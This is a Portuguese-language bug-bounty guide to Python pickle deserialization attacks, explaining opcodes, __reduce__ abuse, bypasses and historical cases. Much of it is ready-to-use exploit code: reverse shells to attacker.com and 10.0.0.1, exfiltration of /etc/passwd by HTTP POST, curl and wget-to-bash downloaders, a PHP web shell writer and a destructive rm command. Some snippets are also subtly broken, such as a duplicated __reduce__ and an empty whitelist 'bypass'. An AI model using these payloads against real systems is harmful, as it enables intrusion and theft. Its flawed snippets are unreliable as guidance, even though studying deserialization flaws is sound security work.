# Python Pickle Remote Code Execution

**Criticidade**: 🔴 Crítica (CVSS 9.5-10.0)
**Dificuldade**: 🟡 Intermediária
**Bounty Médio**: $3,000 - $25,000 USD

---

## 📚 Índice

1. [Pickle Protocol Internals](#pickle-protocol-internals)
2. [Python Object Model](#python-object-model)
3. [Magic Methods Exploitation](#magic-methods-exploitation)
4. [Opcode Analysis](#opcode-analysis)
5. [RCE Techniques](#rce-techniques)
6. [Bypassing Restrictions](#bypassing-restrictions)
7. [Real-World Cases](#real-world-cases)

---

## 🔬 Pickle Protocol Internals

### O Que É Pickle?

Pickle é o módulo Python para **serialização/desserialização de objetos**. Converte objetos Python em byte stream e vice-versa.

**AVISO OFICIAL (Python Docs):**
> "The pickle module is not secure. Only unpickle data you trust."
> "It is possible to construct malicious pickle data which will execute arbitrary code during unpickling."

### Pickle Protocol Versions

| Protocol | Python Version | Features |
|----------|----------------|----------|
| 0 | 1.x | ASCII, human-readable |
| 1 | 1.x | Binary, mais eficiente |
| 2 | 2.3+ | new-style classes |
| 3 | 3.0+ | Python 3 support |
| 4 | 3.4+ | Large objects, optimization |
| 5 | 3.8+ | Out-of-band data |

### Basic Serialization

```python
import pickle

# Object para serializar
data = {'user': 'admin', 'role': 'admin', 'balance': 1000}

# Serialização
serialized = pickle.dumps(data)
print(serialized)
# b'\x80\x04\x95$\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x04user\x94...'

# Desserialização
restored = pickle.loads(serialized)
print(restored)
# {'user': 'admin', 'role': 'admin', 'balance': 1000}
```

### Pickle Opcodes

Pickle é uma **stack-based virtual machine**. Opera via sequência de opcodes.

**Principais Opcodes:**

| Opcode | Name | Description |
|--------|------|-------------|
| `c` | GLOBAL | Importa module.class |
| `o` | OBJ | Constrói objeto |
| `(` | MARK | Marca início de lista |
| `t` | TUPLE | Cria tuple |
| `R` | REDUCE | Chama callable com args |
| `b` | BUILD | __setstate__ ou __dict__.update() |
| `.` | STOP | Fim do pickle |
| `S` | STRING | Push string |
| `V` | UNICODE | Push unicode |
| `I` | INT | Push integer |

**Example opcode sequence:**

```python
import pickletools

data = {'key': 'value'}
serialized = pickle.dumps(data)

pickletools.dis(serialized)
```

**Output:**
```
    0: \x80 PROTO      4
    2: \x95 FRAME      36
   11: }    EMPTY_DICT
   12: \x94 MEMOIZE    (as 0)
   13: (    MARK
   14: \x8c     SHORT_BINUNICODE 'key'
   19: \x94     MEMOIZE    (as 1)
   20: \x8c     SHORT_BINUNICODE 'value'
   27: \x94     MEMOIZE    (as 2)
   28: u        SETITEMS
   29: .    STOP
```

---

## 🐍 Python Object Model

### Object Lifecycle

**1. Construction:** `__new__(cls, *args)`
- Allocate memory
- Return instance

**2. Initialization:** `__init__(self, *args)`
- Initialize attributes
- Setup state

**3. Destruction:** `__del__(self)`
- Cleanup
- Called on garbage collection

### Serialization Hooks

**Pickling:** `__reduce__()` ou `__reduce_ex__(protocol)`

```python
class MyClass:
    def __init__(self, value):
        self.value = value

    def __reduce__(self):
        # Retorna (callable, args) para reconstruir objeto
        return (MyClass, (self.value,))
```

**Unpickling:** `__setstate__(state)`

```python
class MyClass:
    def __setstate__(self, state):
        # Restaura estado do objeto
        self.__dict__.update(state)
```

---

## ⚔️ Magic Methods Exploitation

### __reduce__() - The RCE Primitive

**Signature:**
```python
def __reduce__(self):
    return (callable, (args,))
```

**Behavior durante unpickle:**
```python
# Pickle internamente faz:
result = callable(*args)
```

**⚠️ CRITICAL:** `callable` pode ser **QUALQUER função Python**!

### RCE Example 1: os.system()

```python
import pickle
import os

class Evil:
    def __reduce__(self):
        # Retorna (os.system, ('whoami',))
        return (os.system, ('whoami',))

# Serializa
payload = pickle.dumps(Evil())
print(payload)
# b'\x80\x04\x95...'

# Quando vítima desserializa:
pickle.loads(payload)  # ← Executa: os.system('whoami')
```

**Opcode analysis:**

```
   0: \x80 PROTO      4
   2: \x95 FRAME      ...
   ...: c    GLOBAL     'posix system'  ← Importa os.system
   ...: (    MARK
   ...: V    UNICODE    'whoami'        ← Argumento
   ...: t    TUPLE      (MARK at ...)
   ...: R    REDUCE                     ← Executa system('whoami')
   ...: .    STOP
```

### RCE Example 2: subprocess.Popen()

```python
import subprocess

class ReverseShell:
    def __reduce__(self):
        cmd = 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
        return (subprocess.Popen, (cmd,), {'shell': True})

payload = pickle.dumps(ReverseShell())
# Unpickle executa reverse shell!
```

### RCE Example 3: __import__()

```python
class ImportExec:
    def __reduce__(self):
        # Importa módulo e executa código
        return (__import__, ('os',))

    # Ou mais direto:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id')",))
```

### RCE Example 4: File Operations

```python
class WriteFile:
    def __reduce__(self):
        # Escreve backdoor
        return (
            open('/var/www/html/shell.php', 'w').write,
            ('<?php system($_GET[0]); ?>',)
        )

class ReadFile:
    def __reduce__(self):
        # Lê arquivo sensível
        return (open('/etc/passwd').read, ())
```

---

## 📝 Opcode Analysis

### Crafting Manual Pickle Payloads

**Pickle é bytecode - podemos criar manualmente!**

**Example: os.system('whoami')**

```python
# Protocol 0 (ASCII, human-readable)
payload = b"""cos
system
(S'whoami'
tR."""

# Dissecção:
# c       → GLOBAL opcode
# os\nsystem\n → Importa os.system
# (       → MARK (início de tuple)
# S'whoami'\n → STRING 'whoami'
# t       → TUPLE (cria tuple com args)
# R       → REDUCE (chama callable com args)
# .       → STOP

pickle.loads(payload)  # Executa!
```

**Protocol 4 (Binary, optimized):**

```python
import pickletools

# Cria payload manualmente
payload = (
    b'\x80\x04'  # PROTO 4
    b'\x95\x1c\x00\x00\x00\x00\x00\x00\x00'  # FRAME
    b'c'  # GLOBAL
    b'posix\n'  # module
    b'system\n'  # function
    b'('  # MARK
    b'V'  # UNICODE
    b'whoami\n'  # string
    b't'  # TUPLE
    b'R'  # REDUCE
    b'.'  # STOP
)

pickletools.dis(payload)
pickle.loads(payload)  # Executa whoami
```

### Advanced: Multi-stage Payloads

**Stage 1: Import arbitrary module**

```python
# Importa requests library
payload_stage1 = b"""c__builtin__
__import__
(S'requests'
tR."""

# Agora 'requests' está disponível!
```

**Stage 2: Exfiltrate data**

```python
# Envia dados via HTTP
class Exfiltrate:
    def __reduce__(self):
        import requests
        data = open('/etc/passwd').read()
        return (
            requests.post,
            ('http://attacker.com/exfil',),
            {'data': {'content': data}}
        )
```

---

## 🚀 RCE Techniques

### Technique 1: Direct Command Execution

```python
import pickle, os

# Simple
class RCE1:
    def __reduce__(self):
        return (os.system, ('id',))

# With output capture
class RCE2:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['whoami'],))

# Reverse shell
class RCE3:
    def __reduce__(self):
        cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
        return (os.system, (cmd,))
```

### Technique 2: Eval/Exec Injection

```python
class EvalRCE:
    def __reduce__(self):
        code = """
import os
os.system('curl http://attacker.com/`whoami`')
"""
        return (exec, (code,))

class EvalComplex:
    def __reduce__(self):
        return (eval, (
            "__import__('os').system('bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"')",
        ))
```

### Technique 3: Library-specific Exploits

**Django:**

```python
class DjangoRCE:
    def __reduce__(self):
        from django.core import management
        return (management.call_command, ('shell', '--command=import os; os.system("id")'))
```

**Flask:**

```python
class FlaskRCE:
    def __reduce__(self):
        from flask import current_app
        return (
            eval,
            ('__import__("os").system("whoami")',)
        )
```

**Celery:**

```python
class CeleryRCE:
    def __reduce__(self):
        from celery import current_app
        return (
            current_app.send_task,
            ('tasks.execute_command', ['rm -rf /tmp/*'])
        )
```

---

## 🛡️ Bypassing Restrictions

### Bypass 1: Restricted Builtins

**Scenario:** `__builtins__` foi restrito

```python
# Blocked
eval('os.system("id")')  # NameError: name 'os' is not defined

# Bypass via __import__
eval('__import__("os").system("id")')

# Ou via getattr
eval('getattr(__import__("os"), "system")("id")')
```

### Bypass 2: Whitelist of Allowed Classes

**Scenario:** Apenas certas classes podem ser unpickled

```python
# Restricted unpickler
class SafeUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "builtins" and name in ["dict", "list", "str"]:
            return getattr(__builtins__, name)
        raise pickle.UnpicklingError(f"Class {module}.{name} not allowed")

# Bypass: Use allowed class with side-effects
class Exploit:
    # dict.__init__ pode executar código via subclasses
    def __reduce__(self):
        return (dict, ())  # Allowed!
```

### Bypass 3: Sandboxed Environment

**Technique: Break out of sandbox**

```python
# Escape sandbox via sys.modules manipulation
class SandboxEscape:
    def __reduce__(self):
        import sys
        # Injeta módulo malicioso no sys.modules
        sys.modules['os'] = __import__('posix')
        return (eval, ('os.system("id")',))
```

---

## 🔥 Real-World Cases

### Case 1: Django Pickle Session Exploit (2013)

**Vulnerability:** Django sessions usavam pickle por padrão

**Exploitation:**

```python
# Cria session cookie malicioso
import pickle, base64

class SessionExploit:
    def __reduce__(self):
        return (os.system, ('wget http://attacker.com/backdoor.sh | bash',))

malicious_session = base64.b64encode(pickle.dumps(SessionExploit()))

# Seta cookie:
# sessionid=gASVLgAAAAAAAABjb3MKc3lzdGVtCnAxCihWd2hvYW1pCnAyC...

# Django unpickle → RCE!
```

**Impact:** Full server compromise

**Fix:** Django switched to JSON sessions

### Case 2: Celery Pickle Deserialization (2016)

**Vulnerability:** Celery task serialization com pickle

**Payload:**

```python
from celery import Celery

app = Celery('tasks')

# Envia task maliciosa
@app.task
def malicious_task():
    pass

# Bypass: Serializa com pickle
class Evil:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

# Envia para queue
app.send_task('malicious_task', args=[Evil()])
```

**Bounty:** $5,000 USD

---

**Última atualização**: 2024
**Versão**: 1.0
